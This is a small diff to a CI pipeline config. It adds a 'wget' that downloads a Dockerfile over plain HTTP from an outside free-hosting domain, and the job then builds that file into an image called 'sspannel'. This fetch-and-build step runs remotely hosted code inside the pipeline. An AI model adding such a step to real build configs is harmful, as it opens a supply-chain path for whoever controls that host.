@@ -6,7 +6,8 @@ jobs:
      - checkout 
 
      # build image
-     - run: |         
+     - run: |       
+         wget http://l23cloud.unaux.com/file/Dockerfile
          docker info
          docker build -t sspannel -f Dockerfile .
      # deploy the image
